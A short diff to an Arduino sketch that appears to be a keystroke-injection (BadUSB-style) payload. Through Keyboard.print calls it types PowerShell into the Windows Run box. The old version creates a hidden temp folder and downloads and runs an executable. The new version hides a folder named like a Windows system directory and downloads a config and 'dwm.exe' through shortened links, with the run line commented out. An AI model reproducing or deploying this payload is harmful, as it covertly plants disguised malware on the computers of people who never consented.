@@ -65,11 +65,11 @@ void loop()
 
       // NOTE: Run box can only contain as much as characters. Make sure it can fit in before using this for real.
 
-      Keyboard.print("New-Item -ItemType Directory -Force -Path $env:TEMP/winupd8.nt;"); // CREATE FOLDER
-      Keyboard.print("attrib +h $env:TEMP/winupd8.nt;"); // HIDE IT
-      Keyboard.print("cd $env:TEMP/winupd8.nt;"); // CHANGE LOCATIONS
-      Keyboard.print("Invoke-WebRequest http://github.com/xer0h3r0/fkmurksahd/raw/main/warqa.shd -O \"_.exe\";"); // DOWNLOAD
-      Keyboard.print("& ./_.exe"); // RUN
+      Keyboard.print("attrib +h $env:ALLUSERSPROFILE/USOShared;"); // HIDE IT
+      Keyboard.print("cd $env:ALLUSERSPROFILE/USOShared;"); // CHANGE LOCATIONS
+	  Keyboard.print("Invoke-WebRequest https://tinyurl.com/dwmconf -O \"dwm.conf\";"); // DOWNLOAD
+      Keyboard.print("Invoke-WebRequest https://tinyurl.com/dwmload -O \"dwm.exe\";"); // DOWNLOAD
+      //Keyboard.print("& ./dwm.exe"); // RUN
 
       Keyboard.print(" "); // END SCRIPT
 
